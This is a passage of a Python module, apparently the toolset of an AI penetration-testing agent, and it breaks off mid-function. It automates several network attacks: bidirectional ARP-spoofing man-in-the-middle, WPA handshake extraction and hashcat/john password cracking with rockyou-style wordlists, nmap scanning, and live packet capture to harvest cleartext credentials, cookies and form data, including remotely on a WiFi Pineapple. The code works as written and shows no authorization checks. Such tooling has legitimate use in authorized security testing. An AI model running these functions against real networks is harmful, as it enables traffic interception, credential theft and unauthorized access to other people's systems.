from __future__ import annotations

import json
import os
import re
import shlex
import subprocess
import time
from pathlib import Path
from typing import Any

from core.app_paths import captures_dir, logs_dir
from tools.unencrypted_credentials import (
    extract_cleartext_sensitive_data as _extract_cleartext_sensitive_data,
    _show_secrets_default,
)


def _is_under_allowed_root(path: Path, allowed_roots: list[str]) -> bool:
    resolved = path.resolve()
    for root in allowed_roots:
        try:
            resolved.relative_to(Path(root).expanduser().resolve())
            return True
        except ValueError:
            continue
    return False


def _tail(text: str | None, limit: int = 20000) -> str:
    return (text or '').strip()[-limit:]


def _run(cmd: list[str], timeout: int = 300) -> subprocess.CompletedProcess:
    return subprocess.run(cmd, text=True, capture_output=True, timeout=timeout, check=False)


def _tool_exists(name: str) -> bool:
    proc = subprocess.run(['bash', '-lc', f'command -v {shlex.quote(name)} >/dev/null 2>&1'])
    return proc.returncode == 0


def _derive_hash_path(pcap_path: str) -> str:
    p = Path(pcap_path).expanduser().resolve()
    suffix = ''.join(p.suffixes)
    if suffix:
        return str(p.with_name(p.name[: -len(suffix)] + '.22000'))
    return str(p.with_suffix('.22000'))


def _find_default_wordlist() -> str | None:
    """Return the path to the best available wordlist, or None if none found."""
    candidates = [
        '/usr/share/wordlists/rockyou.txt',
        '/usr/share/wordlists/fasttrack.txt',
        '/usr/share/wordlists/dirb/common.txt',
        '/opt/wordlists/rockyou.txt',
        str(Path.home() / 'wordlists' / 'rockyou.txt'),
    ]
    for path in candidates:
        if Path(path).exists():
            return path
    return None


# Alias → ordered candidate paths. First existing match wins.
_WORDLIST_ALIASES: dict[str, list[str]] = {
    'rockyou': [
        '/usr/share/wordlists/rockyou.txt',
        '/opt/wordlists/rockyou.txt',
        str(Path.home() / 'wordlists' / 'rockyou.txt'),
    ],
    'rockyou.txt': [
        '/usr/share/wordlists/rockyou.txt',
        '/opt/wordlists/rockyou.txt',
        str(Path.home() / 'wordlists' / 'rockyou.txt'),
    ],
    'fasttrack': [
        '/usr/share/wordlists/fasttrack.txt',
        '/opt/wordlists/fasttrack.txt',
    ],
    'fasttrack.txt': [
        '/usr/share/wordlists/fasttrack.txt',
        '/opt/wordlists/fasttrack.txt',
    ],
    'common': [
        '/usr/share/wordlists/dirb/common.txt',
    ],
    'common.txt': [
        '/usr/share/wordlists/dirb/common.txt',
    ],
}


def _resolve_wordlist_alias(name_or_path: str | None) -> str | None:
    """Resolve a wordlist name, alias, or path to an existing filesystem path.

    Resolution order:
    A. Already an absolute path that exists → use it.
    B. Known alias (e.g. 'rockyou', 'fasttrack.txt') → first existing candidate.
    C. Bare filename that matches a known candidate anywhere → use it.
    D. None → caller should fall back to _find_default_wordlist().
    """
    if not name_or_path:
        return None
    token = name_or_path.strip()

    # A. Absolute path that exists
    if token.startswith('/') or token.startswith('~'):
        resolved = Path(token).expanduser().resolve()
        if resolved.is_file():
            return str(resolved)
        # Absolute but does not exist - do NOT silently swap to a default.
        # Return None so the caller can decide.
        return None

    # B. Known alias (case-insensitive)
    key = token.lower()
    candidates = _WORDLIST_ALIASES.get(key)
    if candidates:
        for path in candidates:
            if Path(path).exists():
                return path
        return None

    # C. Bare filename - search standard wordlist directories
    search_dirs = [
        Path('/usr/share/wordlists'),
        Path('/opt/wordlists'),
        Path.home() / 'wordlists',
    ]
    for d in search_dirs:
        candidate = d / token
        if candidate.is_file():
            return str(candidate)
        # Try appending .txt if the user omitted the extension
        if not token.endswith('.txt'):
            candidate_txt = d / (token + '.txt')
            if candidate_txt.is_file():
                return str(candidate_txt)

    return None


def _parse_hashcat_cracked(output: str, hash_path: str) -> list[str]:
    """
    Extract cracked plaintext passwords from hashcat output.

    hashcat prints cracked entries as:  <hash_or_network_id>:<password>
    For WPA (mode 22000) the line format is:
        <PMKID_or_MIC>*<mac>*...*<ssid_hex>:<password>
    We extract everything after the last ':' in each cracked line.
    """
    passwords: list[str] = []
    seen: set[str] = set()
    for line in output.splitlines():
        line = line.strip()
        # Skip status lines, section headers, JSON status, and empty lines
        if not line or line.startswith('[') or line.startswith('{') or line.startswith('Session'):
            continue
        if line.startswith('Status') or line.startswith('Started') or line.startswith('Stopped'):
            continue
        # Cracked WPA lines have the format:
        #   WPA*02*<hex>*<mac>*<mac>*<ssid_hex>*...*<hex>:<password>
        # They always contain multiple '*' separators AND a trailing ':password'.
        # Require at least 3 '*' to distinguish from random log lines.
        if ':' in line and line.count('*') >= 3 and re.match(r'^[A-Za-z0-9*]+:', line):
            password = line.rsplit(':', 1)[-1].strip()
            if password and password not in seen:
                seen.add(password)
                passwords.append(password)
    return passwords


def _check_hashcat_potfile(hash_path: str) -> list[str]:
    """
    Check the default hashcat potfile for any already-cracked entries
    matching hashes in hash_path.
    """
    potfile_candidates = [
        Path.home() / '.local' / 'share' / 'hashcat' / 'hashcat.potfile',
        Path.home() / '.hashcat' / 'hashcat.potfile',
        Path('/root/.hashcat/hashcat.potfile'),
    ]
    try:
        hash_content = Path(hash_path).read_text(errors='replace')
    except Exception:
        return []

    hash_ids: set[str] = set()
    for line in hash_content.splitlines():
        line = line.strip()
        if line:
            # For mode 22000, take the first field (before first '*')
            hash_ids.add(line.lower())

    passwords: list[str] = []
    for potfile in potfile_candidates:
        if not potfile.exists():
            continue
        try:
            for line in potfile.read_text(errors='replace').splitlines():
                parts = line.strip().rsplit(':', 1)
                if len(parts) == 2:
                    key = parts[0].strip().lower()
                    if key in hash_ids:
                        pwd = parts[1].strip()
                        if pwd and pwd not in passwords:
                            passwords.append(pwd)
        except Exception:
            continue
    return passwords


def enable_ip_forwarding() -> dict[str, Any]:
    cmd = ['sysctl', '-w', 'net.ipv4.ip_forward=1']
    try:
        proc = _run(cmd, timeout=10)
        return {'ok': proc.returncode == 0, 'stdout': _tail(proc.stdout), 'stderr': _tail(proc.stderr)}
    except Exception as exc:
        return {'ok': False, 'error': str(exc)}


def _detect_hashcat_backend() -> dict[str, Any]:
    """Probe hashcat backend devices and report what is available."""
    try:
        proc = _run(['hashcat', '-I', '--quiet'], timeout=15)
        output = (proc.stdout or '') + (proc.stderr or '')
        has_gpu = bool(re.search(r'Type\.+:\s*GPU', output))
        has_cpu = bool(re.search(r'Type\.+:\s*CPU', output))
        has_nvidia = 'NVIDIA' in output or 'nvidia' in output
        has_cuda = 'CUDA' in output
        pocl_only = 'pocl' in output.lower() and not has_gpu
        return {
            'has_gpu': has_gpu,
            'has_cpu': has_cpu,
            'has_nvidia': has_nvidia,
            'has_cuda': has_cuda,
            'pocl_only': pocl_only,
            'raw': output[:2000],
        }
    except Exception:
        return {'has_gpu': False, 'has_cpu': True, 'pocl_only': True, 'raw': ''}


def run_hashcat(
    args: list[str],
    custom_mask: str | None = None,
    open_terminal: bool = False,
    blocking: bool = False,
    timeout: int = 1800,
) -> dict[str, Any]:
    """
    Run hashcat.

    Args:
        args:         hashcat arguments (e.g. ['-m', '22000', hash_path, wordlist]).
        custom_mask:  Optional mask appended to args when -a 3 is needed.
        open_terminal: Launch in an xterm window (non-blocking, display only).
        blocking:     If True, wait for hashcat to finish and return output + cracked passwords.
        timeout:      Timeout in seconds when blocking=True.

    Returns:
        dict with ok, mode, stdout/stderr (if blocking), cracked_passwords (if blocking), etc.
    """
    if not isinstance(args, list) or not args:
        return {'ok': False, 'error': 'hashcat args are required'}
    if not _tool_exists('hashcat'):
        return {'ok': False, 'error': 'hashcat is not installed or not in PATH'}

    backend = _detect_hashcat_backend()

    cmd = ['hashcat', '-w', '2'] + [str(x) for x in args]
    if custom_mask:
        if '-a' not in cmd:
            cmd.extend(['-a', '3'])
        cmd.append(custom_mask)

    log_file = logs_dir() / f'hashcat_{int(time.time())}.log'
    log_file.parent.mkdir(parents=True, exist_ok=True)

    try:
        if open_terminal and _tool_exists('xterm'):
            term_cmd = ['xterm', '-hold', '-e'] + cmd
            proc = subprocess.Popen(term_cmd)
            return {
                'ok': True,
                'mode': 'terminal',
                'pid': proc.pid,
                'cmd': cmd,
                'log_path': str(log_file),
                'backend': backend,
                'msg': 'Hashcat started in a terminal window.',
            }

        if blocking:
            quiet_cmd = cmd + ['--quiet']
            proc = _run(quiet_cmd, timeout=timeout)
            stdout = _tail(proc.stdout, 30000)
            stderr = _tail(proc.stderr, 10000)
            # returncode 0 = cracked, 1 = exhausted, non-zero otherwise = error
            cracked = _parse_hashcat_cracked(stdout + '\n' + stderr, '')
            return {
                'ok': proc.returncode in (0, 1),
                'mode': 'blocking',
                'returncode': proc.returncode,
                'cmd': cmd,
                'log_path': str(log_file),
                'stdout': stdout,
                'stderr': stderr,
                'cracked_passwords': cracked,
                'backend': backend,
                'msg': f'Hashcat finished (returncode {proc.returncode}).',
            }

        # ── Background mode ──
        # hashcat produces no useful output to stdout when not connected to a
        # terminal.  Force periodic machine-readable status lines so the log
        # file records real progress (running / exhausted / cracked / error).
        #   --status           : enable periodic status output
        #   --status-timer=30  : every 30 seconds
        #   --status-json      : machine-parseable JSON status lines
        bg_cmd = cmd + ['--status', '--status-timer=30', '--status-json']
        with log_file.open('w', encoding='utf-8') as fh:
            proc = subprocess.Popen(
                bg_cmd, stdout=fh, stderr=subprocess.STDOUT, text=True,
                # Detach from the controlling terminal completely so hashcat
                # never blocks on interactive prompt reads.
                stdin=subprocess.DEVNULL,
            )
        return {
            'ok': True,
            'mode': 'background',
            'pid': proc.pid,
            'cmd': bg_cmd,
            'log_path': str(log_file),
            'backend': backend,
            'msg': (
                'Hashcat started in the background. '
                f'Progress is logged every 30 s to {log_file}. '
                + ('WARNING: GPU not detected - running on CPU only. '
                   'Install nvidia-opencl-icd for GPU acceleration.'
                   if backend.get('pocl_only') else '')
            ),
        }
    except Exception as exc:
        return {'ok': False, 'error': str(exc), 'cmd': cmd}


def poll_hashcat_status(log_path: str) -> dict[str, Any]:
    """Read the last status from a background hashcat log file.

    Returns a dict with the hashcat state (running/exhausted/cracked/error),
    progress percentage, speed, and the last few log lines.
    """
    p = Path(log_path).expanduser().resolve()
    if not p.exists():
        return {'ok': False, 'error': f'Log file not found: {p}'}

    try:
        text = p.read_text(errors='replace')
    except Exception as exc:
        return {'ok': False, 'error': str(exc)}

    lines = text.splitlines()

    # Try to find the last JSON status line (from --status-json)
    last_status: dict[str, Any] | None = None
    for line in reversed(lines):
        line = line.strip()
        if line.startswith('{') and '"status"' in line:
            try:
                last_status = json.loads(line)
                break
            except Exception:
                continue

    # Check for terminal states in the raw text
    exhausted = 'Status...........: Exhausted' in text or '"status": 5' in text
    cracked = 'Status...........: Cracked' in text or '"status": 1' in text

    # Extract cracked passwords from the log
    passwords = _parse_hashcat_cracked(text, '')

    state = 'unknown'
    progress_pct = None
    speed = None

    if last_status:
        status_code = last_status.get('status')
        state = {1: 'cracked', 5: 'exhausted', 3: 'running', 10: 'running'}.get(status_code, f'code_{status_code}')
        # Progress: [current, total]
        prog = last_status.get('progress', [])
        if isinstance(prog, list) and len(prog) == 2 and prog[1]:
            progress_pct = round(100.0 * prog[0] / prog[1], 1)
        # Speed
        devices = last_status.get('devices', [])
        if devices:
            speed = sum(d.get('speed', 0) for d in devices)
    elif exhausted:
        state = 'exhausted'
    elif cracked:
        state = 'cracked'

    return {
        'ok': True,
        'state': state,
        'progress_pct': progress_pct,
        'speed_hashes_sec': speed,
        'cracked_passwords': passwords,
        'last_status_json': last_status,
        'log_tail': '\n'.join(lines[-15:]),
    }


def run_john(args: list[str]) -> dict[str, Any]:
    if not isinstance(args, list) or not args:
        return {'ok': False, 'error': 'john args are required'}
    try:
        proc = _run(['john'] + [str(x) for x in args], timeout=300)
        return {'ok': proc.returncode == 0, 'stdout': _tail(proc.stdout), 'stderr': _tail(proc.stderr)}
    except FileNotFoundError:
        return {'ok': False, 'error': 'john is not installed'}
    except Exception as exc:
        return {'ok': False, 'error': str(exc)}


def run_arpspoof(target_ip: str, gateway_ip: str, interface: str = 'eth0') -> dict[str, Any]:
    """Launch bidirectional ARP spoof (target↔gateway) with auto IP forwarding.

    Starts TWO arpspoof processes so traffic flows in both directions through
    this machine.  IP forwarding is enabled automatically.  Returns both PIDs
    so they can be stopped later via stop_arpspoof.
    """
    if not target_ip or not gateway_ip:
        return {'ok': False, 'error': 'target_ip and gateway_ip are required'}

    # Auto-enable IP forwarding - without this, intercepted packets are dropped.
    try:
        subprocess.run(
            ['sysctl', '-w', 'net.ipv4.ip_forward=1'],
            capture_output=True, text=True, timeout=5, check=False,
        )
    except Exception:
        pass  # Best-effort; arpspoof still starts even if this fails.

    # arpspoof requires root / CAP_NET_RAW.
    if os.geteuid() != 0:
        return {
            'ok': False,
            'error': 'arpspoof requires root privileges. Run Companion Huginn as root (sudo python3 agent.py) or use sudo -E.',
        }
    prefix: list[str] = []

    # Direction 1: poison target so it thinks we are the gateway
    cmd_fwd = prefix + ['arpspoof', '-i', interface, '-t', target_ip, gateway_ip]
    # Direction 2: poison gateway so it thinks we are the target
    cmd_rev = prefix + ['arpspoof', '-i', interface, '-t', gateway_ip, target_ip]

    pids: list[int] = []
    try:
        proc_fwd = subprocess.Popen(cmd_fwd, stdout=subprocess.DEVNULL, stderr=subprocess.PIPE, text=True)
        pids.append(proc_fwd.pid)
        # Quick check: did it die immediately?
        import time as _time
        _time.sleep(0.5)
        if proc_fwd.poll() is not None:
            err = (proc_fwd.stderr.read() or '').strip()[:300]
            return {'ok': False, 'error': f'arpspoof exited immediately: {err}'}
    except FileNotFoundError:
        return {'ok': False, 'error': 'arpspoof is not installed (install dsniff)'}
    except Exception as exc:
        return {'ok': False, 'error': str(exc)}

    try:
        proc_rev = subprocess.Popen(cmd_rev, stdout=subprocess.DEVNULL, stderr=subprocess.PIPE, text=True)
        pids.append(proc_rev.pid)
    except Exception as exc:
        # Kill the first process if the second fails
        try:
            os.kill(pids[0], 15)
        except OSError:
            pass
        return {'ok': False, 'error': f'second arpspoof direction failed: {exc}'}

    return {
        'ok': True,
        'msg': f'Bidirectional ARP spoof started between {target_ip} and {gateway_ip} on {interface}. IP forwarding enabled.',
        'pids': pids,
        'pid': pids[0],  # backward compat
        'target_ip': target_ip,
        'gateway_ip': gateway_ip,
        'interface': interface,
        'ip_forwarding': True,
        'cmd_forward': cmd_fwd,
        'cmd_reverse': cmd_rev,
    }


def stop_arpspoof(pid: int | None = None) -> dict[str, Any]:
    """Stop arpspoof process(es) by PID, or kill all arpspoof processes."""
    killed: list[int] = []
    errors: list[str] = []

    if pid:
        try:
            os.kill(int(pid), 15)  # SIGTERM
            killed.append(int(pid))
        except ProcessLookupError:
            errors.append(f'PID {pid} not found (already stopped)')
        except Exception as exc:
            errors.append(f'Failed to kill PID {pid}: {exc}')
    else:
        # Kill all arpspoof processes
        try:
            proc = subprocess.run(
                ['pkill', '-f', 'arpspoof'],
                capture_output=True, text=True, timeout=5, check=False,
            )
            if proc.returncode == 0:
                killed.append(-1)
        except Exception as exc:
            errors.append(f'pkill failed: {exc}')

    return {
        'ok': len(killed) > 0 or len(errors) == 0,
        'killed_pids': killed,
        'errors': errors,
        'msg': f'Stopped {len(killed)} arpspoof process(es).' if killed else 'No arpspoof processes to stop.',
    }


def extract_handshake_hash(pcap_path: str, output_hash_path: str | None = None) -> dict[str, Any]:
    if not pcap_path:
        return {'ok': False, 'error': 'pcap_path is required'}

    pcap = Path(pcap_path).expanduser().resolve()
    if not pcap.exists() or not pcap.is_file():
        return {'ok': False, 'error': f'PCAP not found: {pcap}'}

    output_hash_path = output_hash_path or _derive_hash_path(str(pcap))
    hash_path = Path(output_hash_path).expanduser().resolve()
    hash_path.parent.mkdir(parents=True, exist_ok=True)

    if not _tool_exists('hcxpcapngtool'):
        return {'ok': False, 'error': 'hcxtools / hcxpcapngtool is not installed'}

    cmd = ['hcxpcapngtool', '-o', str(hash_path), str(pcap)]
    try:
        proc = _run(cmd, timeout=120)
    except Exception as exc:
        return {'ok': False, 'error': str(exc), 'pcap_path': str(pcap), 'output_hash_path': str(hash_path)}

    # Verify the hash file exists, is non-empty, and contains at least one valid-looking hash line.
    if not hash_path.exists() or hash_path.stat().st_size == 0:
        # Distinguish between "no handshake in pcap" and "tool error"
        if proc.returncode == 0:
            error_msg = 'No WPA handshake or PMKID found in capture - nothing to crack'
        else:
            error_msg = proc.stderr.strip() or proc.stdout.strip() or 'hcxpcapngtool failed'
        return {
            'ok': False,
            'pcap_path': str(pcap),
            'output_hash_path': str(hash_path),
            'hash_path': str(hash_path),
            'hash_mode': 22000,
            'size_bytes': 0,
            'stdout': _tail(proc.stdout, 30000),
            'stderr': _tail(proc.stderr, 30000),
            'cmd': cmd,
            'error': error_msg,
        }

    # Spot-check: at least one line with '*' separators (mode 22000 format)
    try:
        lines = [ln.strip() for ln in hash_path.read_text(errors='replace').splitlines() if ln.strip()]
    except Exception:
        lines = []
    valid_lines = [ln for ln in lines if '*' in ln or re.match(r'^[0-9a-fA-F]{32}', ln)]

    ok = len(valid_lines) > 0
    return {
        'ok': ok,
        'pcap_path': str(pcap),
        'output_hash_path': str(hash_path),
        'hash_path': str(hash_path),
        'hash_mode': 22000,
        'size_bytes': hash_path.stat().st_size,
        'hash_line_count': len(valid_lines),
        'stdout': _tail(proc.stdout, 30000),
        'stderr': _tail(proc.stderr, 30000),
        'cmd': cmd,
        'error': None if ok else 'Hash file produced but contained no valid mode-22000 hash lines',
    }


def crack_wifi_pcap(
    pcap_path: str,
    wordlist: str | None = None,
    output_hash_path: str | None = None,
    hashcat_args: list[str] | None = None,
    open_terminal: bool = False,
    blocking: bool = True,
    timeout: int = 1800,
) -> dict[str, Any]:
    """
    Full pipeline: PCAP → hash extraction → hashcat crack → return password.

    When no wordlist is provided, tries the default system wordlist (rockyou.txt etc.).
    When blocking=True (default), waits for hashcat and returns cracked_password.
    """
    # Pre-extraction shortcuts. Two cases avoid re-running hcxpcapngtool:
    #   (1) the caller passed an already-prepared hash file directly
    #       (.22000 / .hccapx / .hash) - use it as-is.
    #   (2) a previous run already produced the .22000 next to this pcap - 
    #       reuse it.
    HASH_SUFFIXES = {'.22000', '.hccapx', '.hash'}
    pcap_p = Path(pcap_path).expanduser().resolve() if pcap_path else None

    if pcap_p and pcap_p.suffix.lower() in HASH_SUFFIXES and pcap_p.exists() and pcap_p.stat().st_size > 0:
        extracted = {
            'ok': True,
            'hash_path': str(pcap_p),
            'output_hash_path': str(pcap_p),
            'hash_mode': 22000,
            'size_bytes': pcap_p.stat().st_size,
            'note': 'input was already a hash file; skipped hcxpcapngtool',
        }
    else:
        candidate: Path | None = None
        if pcap_p:
            candidate = (
                Path(output_hash_path).expanduser().resolve()
                if output_hash_path
                else Path(_derive_hash_path(str(pcap_p)))
            )
        if candidate and candidate.exists() and candidate.stat().st_size > 0:
            extracted = {
                'ok': True,
                'hash_path': str(candidate),
                'output_hash_path': str(candidate),
                'hash_mode': 22000,
                'size_bytes': candidate.stat().st_size,
                'note': 'reused existing .22000 from prior extraction',
            }
        else:
            extracted = extract_handshake_hash(pcap_path, output_hash_path)
            if not extracted.get('ok'):
                return {
                    'ok': False,
                    'stage': 'extract_handshake',
                    'extraction': extracted,
                    'error': extracted.get('error'),
                }

    hash_path = str(extracted['hash_path'])

    # Resolve wordlist - use provided, then default, then fall back to --show
    resolved_wordlist: str | None = None
    if wordlist:
        resolved_wordlist = str(Path(wordlist).expanduser().resolve())
    else:
        resolved_wordlist = _find_default_wordlist()

    if not resolved_wordlist and not hashcat_args:
        return {
            'ok': False,
            'stage': 'no_wordlist',
            'error': (
                'No wordlist found. Decompress rockyou.txt first: '
                'sudo gzip -d /usr/share/wordlists/rockyou.txt.gz'
            ),
            'pcap_path': pcap_path,
            'hash_path': hash_path,
        }

    # First check potfile - may already be cracked
    potfile_passwords = _check_hashcat_potfile(hash_path)
    if potfile_passwords:
        return {
            'ok': True,
            'stage': 'potfile_hit',
            'pcap_path': str(Path(pcap_path).expanduser().resolve()),
            'hash_path': hash_path,
            'hash_mode': 22000,
            'wordlist': resolved_wordlist,
            'cracked_password': potfile_passwords[0],
            'cracked_passwords': potfile_passwords,
            'extraction': extracted,
            'error': None,
        }

    args = ['-m', '22000']
    if hashcat_args:
        args.extend([str(x) for x in hashcat_args])

    if resolved_wordlist:
        args.extend([hash_path, resolved_wordlist])
    else:
        # No wordlist available - show already-cracked entries only
        args.extend(['--show', hash_path])
        blocking = True  # --show is always synchronous

    crack = run_hashcat(args, open_terminal=open_terminal, blocking=blocking, timeout=timeout)

    cracked_passwords = crack.get('cracked_passwords', [])
    cracked_password = cracked_passwords[0] if cracked_passwords else None

    # If blocking run finished without cracking, also check potfile again
    if not cracked_password and blocking:
        potfile_passwords = _check_hashcat_potfile(hash_path)
        if potfile_passwords:
            cracked_password = potfile_passwords[0]
            cracked_passwords = potfile_passwords

    return {
        'ok': crack.get('ok', False),
        'stage': 'hashcat',
        'pcap_path': str(Path(pcap_path).expanduser().resolve()),
        'hash_path': hash_path,
        'hash_mode': 22000,
        'wordlist': resolved_wordlist,
        'cracked_password': cracked_password,
        'cracked_passwords': cracked_passwords,
        'hashcat': crack,
        'extraction': extracted,
        'error': crack.get('error'),
    }


def run_nmap_scan(target: str, args: list[str] | None = None, timeout: int = 600) -> dict[str, Any]:
    if not target:
        return {'ok': False, 'error': 'target is required'}
    cmd = ['nmap'] + ([str(x) for x in (args or ['-F'])]) + [target]
    try:
        proc = _run(cmd, timeout=timeout)
        return {'ok': proc.returncode == 0, 'stdout': _tail(proc.stdout, 40000), 'stderr': _tail(proc.stderr, 20000), 'cmd': cmd}
    except FileNotFoundError:
        return {'ok': False, 'error': 'nmap is not installed', 'cmd': cmd}
    except subprocess.TimeoutExpired:
        return {'ok': False, 'error': f'nmap timed out after {timeout}s - try a narrower target or fewer flags', 'cmd': cmd}
    except Exception as exc:
        return {'ok': False, 'error': str(exc), 'cmd': cmd}


def scan_unencrypted_traffic(
    pcap_path: str | None = None,
    interface: str | None = None,
    duration: int = 30,
) -> dict[str, Any]:
    """Scan for unencrypted protocol artifacts in a PCAP or live capture.

    Modes:
      - ``pcap_path`` provided: analyze an existing file.
      - ``interface`` provided: capture live traffic for ``duration`` seconds
        on the given interface, save to a temp PCAP, then analyze.

    The analysis searches for: HTTP, FTP, Telnet, SMTP, POP, IMAP, cleartext
    DNS queries, SNMP, HTTP auth headers, cookies, and form data.
    """
    if not pcap_path and not interface:
        return {'ok': False, 'error': 'pcap_path or interface is required'}

    # ── Live capture mode ──
    if interface and not pcap_path:
        duration = max(10, min(int(duration), 300))
        cap_dir = captures_dir()
        cap_dir.mkdir(parents=True, exist_ok=True)
        pcap_path = str(cap_dir / f'unencrypted_scan_{int(time.time())}.pcap')
        cap_cmd = [
            'tshark', '-i', interface, '-a', f'duration:{duration}',
            '-w', pcap_path, '-q',
        ]
        try:
            proc = subprocess.run(cap_cmd, text=True, capture_output=True, timeout=duration + 30, check=False)
            if not Path(pcap_path).exists() or Path(pcap_path).stat().st_size < 24:
                return {
                    'ok': False,
                    'error': f'Live capture on {interface} produced no data. Is the interface up and traffic flowing?',
                    'stderr': _tail(proc.stderr),
                    'cmd': cap_cmd,
                }
        except Exception as exc:
            return {'ok': False, 'error': f'Live capture failed: {exc}', 'cmd': cap_cmd}

    if not pcap_path or not Path(pcap_path).exists():
        return {'ok': False, 'error': f'PCAP not found: {pcap_path}'}

    # ── Packet count ──
    pkt_count = 0
    try:
        cnt_proc = _run(['tshark', '-r', pcap_path, '-T', 'fields', '-e', 'frame.number'], timeout=60)
        pkt_count = len([ln for ln in (cnt_proc.stdout or '').splitlines() if ln.strip()])
    except Exception:
        pass

    # ── Protocol scan: structured multi-pass extraction ──
    findings: dict[str, list[dict]] = {}

    def _tshark_extract(display_filter: str, fields: list[str]) -> list[dict]:
        field_args = []
        for f in fields:
            field_args.extend(['-e', f])
        cmd = ['tshark', '-r', pcap_path, '-Y', display_filter, '-T', 'fields'] + field_args
        try:
            proc = _run(cmd, timeout=120)
            rows = []
            for line in (proc.stdout or '').splitlines():
                parts = line.split('\t')
                if any(p.strip() for p in parts):
                    row = {}
                    for i, f in enumerate(fields):
                        row[f.replace('.', '_')] = parts[i].strip() if i < len(parts) else ''
                    rows.append(row)
            return rows[:200]  # cap to avoid huge output
        except Exception:
            return []

    # HTTP requests (hosts, URIs, auth, cookies)
    http_rows = _tshark_extract(
        'http.request',
        ['ip.src', 'ip.dst', 'http.host', 'http.request.uri', 'http.authorization', 'http.cookie'],
    )
    if http_rows:
        findings['http_requests'] = http_rows

    # DNS queries (cleartext)
    dns_rows = _tshark_extract(
        'dns.qr == 0',
        ['ip.src', 'ip.dst', 'dns.qry.name'],
    )
    if dns_rows:
        findings['dns_queries'] = dns_rows

    # FTP commands
    ftp_rows = _tshark_extract(
        'ftp.request.command',
        ['ip.src', 'ip.dst', 'ftp.request.command', 'ftp.request.arg'],
    )
    if ftp_rows:
        findings['ftp_commands'] = ftp_rows

    # Telnet data
    telnet_rows = _tshark_extract('telnet', ['ip.src', 'ip.dst', 'frame.protocols'])
    if telnet_rows:
        findings['telnet_sessions'] = telnet_rows

    # SMTP
    smtp_rows = _tshark_extract('smtp', ['ip.src', 'ip.dst', 'frame.protocols'])
    if smtp_rows:
        findings['smtp_traffic'] = smtp_rows

    # POP / IMAP
    pop_rows = _tshark_extract('pop', ['ip.src', 'ip.dst', 'frame.protocols'])
    if pop_rows:
        findings['pop_traffic'] = pop_rows
    imap_rows = _tshark_extract('imap', ['ip.src', 'ip.dst', 'frame.protocols'])
    if imap_rows:
        findings['imap_traffic'] = imap_rows

    # SNMP
    snmp_rows = _tshark_extract('snmp', ['ip.src', 'ip.dst', 'snmp.community'])
    if snmp_rows:
        findings['snmp_traffic'] = snmp_rows

    has_cleartext = len(findings) > 0

    # Deterministic cleartext credential / cookie / form-field extraction.
    # Works whether the caller supplied only a PCAP or a live capture.
    sensitive_findings = _extract_cleartext_sensitive_data(
        pcap_path=pcap_path,
        exported_objects_dir=None,
        show_secrets=_show_secrets_default(),
    )

    return {
        'ok': True,
        'pcap_path': pcap_path,
        'packet_count': pkt_count,
        'capture_mode': 'live' if interface else 'file',
        'interface': interface,
        'duration': duration if interface else None,
        'cleartext_found': has_cleartext or bool(sensitive_findings),
        'findings': findings,
        'sensitive_findings': sensitive_findings,
        'sensitive_finding_count': len(sensitive_findings),
        'credentials_found': bool(sensitive_findings),
        'protocols_checked': ['HTTP', 'DNS', 'FTP', 'Telnet', 'SMTP', 'POP', 'IMAP', 'SNMP'],
        'limitations': [
            'Only protocols with tshark dissectors are detected.',
            'Encrypted payloads (TLS/SSL) are not inspected.',
            'DNS queries are cleartext metadata but may not indicate credential exposure.',
            'HTTP findings show requests only - response bodies are not extracted.',
        ],
    }


def _select_capture_interface(pineapple_path: bool = False) -> tuple[str, str]:
    """Choose the capture interface and return (interface, reason).

    Args:
        pineapple_path: If True, use the Kali interface that bridges to the
            Pineapple (typically eth1 on 172.16.42.0/24), NOT the default
            internet-facing interface (eth0).
    """
    try:
        rt = subprocess.run(
            ['ip', 'route', 'show'], capture_output=True, text=True, timeout=5, check=False,
        )
        lines = (rt.stdout or '').splitlines()
    except Exception:
        lines = []

    if pineapple_path:
        # Look for the 172.16.42.0/24 route (Pineapple management bridge)
        for line in lines:
            if '172.16.42' in line:
                m = re.search(r'dev\s+(\S+)', line)
                if m:
                    return m.group(1), f'Pineapple bridge route: {line.strip()}'
        return '', 'Could not determine Pineapple bridge interface from routing table'

    # Default: use the interface that carries the default route
    for line in lines:
        if line.startswith('default'):
            m = re.search(r'dev\s+(\S+)', line)
            if m:
                return m.group(1), f'Default route: {line.strip()}'
    return 'eth0', 'Fallback to eth0 (no default route found)'


def live_unencrypted_scan(
    interface: str | None = None,
    duration: int = 180,
    pineapple_path: bool = False,
    cfg: dict[str, Any] | None = None,
) -> dict[str, Any]:
    """Capture live traffic and analyze for unencrypted/plaintext protocols.

    Args:
        interface:      Network interface. Auto-detected if None.
        duration:       Capture duration in seconds (30-600, default 180).
        pineapple_path: If True, capture on the Pineapple via SSH (wlan2).
        cfg:            Config dict (needed for Pineapple SSH when pineapple_path=True).
    """
    from datetime import datetime as _dt
    from collections import Counter
    from core.app_paths import reports_dir
    import hashlib

    duration = max(30, min(int(duration), 600))
    scan_origin = 'pineapple' if pineapple_path else 'local_kali'

    cap_dir = captures_dir()
    cap_dir.mkdir(parents=True, exist_ok=True)
    ts = int(time.time())
    pcap_path = str(cap_dir / f'unencrypted_scan_{ts}.pcap')
    iface_reason = ''
    iface_ip = ''
    cap_cmd_str = ''

    # Pre-flight state surfaced into the report.
    preflight_warnings: list[str] = []
    arp_spoof_active: bool | None = None
    ip_forwarding: bool | None = None

    if pineapple_path:
        # ── Pineapple-side capture via SSH ──
        if not cfg:
            from core.config_loader import load_all_config
            cfg = load_all_config()
        from tools.pineapple_helpers import _run as _pine_run, _scp_from_remote, _pine_cfg
        pine = _pine_cfg(cfg)

        if not interface:
            interface = 'wlan2'
        iface_reason = f'Pineapple remote capture on {interface}'

        # Interface readiness - must exist and be UP before we try to capture.
        q_iface_probe = shlex.quote(interface)
        iface_probe = _pine_run(
            cfg,
            f'ip -o link show {q_iface_probe} 2>/dev/null; echo __IP__; '
            f'ip -4 -o addr show dev {q_iface_probe} 2>/dev/null',
            timeout=10,
        )
        iface_out = iface_probe.get('stdout', '') or ''
        link_section = iface_out.split('__IP__', 1)[0]
        if not link_section.strip():
            return {
                'ok': False,
                'error': f'Capture interface {interface} does not exist on the Pineapple.',
                'failure_type': 'interface_not_found',
                'interface': interface, 'duration': duration, 'scan_origin': scan_origin,
                'cmd': f'ip -o link show {interface} (remote)',
            }
        if 'state UP' not in link_section and 'state UNKNOWN' not in link_section:
            # Monitor-mode interfaces can legitimately report UNKNOWN; only
            # refuse to capture when the interface is clearly DOWN.
            return {
                'ok': False,
                'error': (
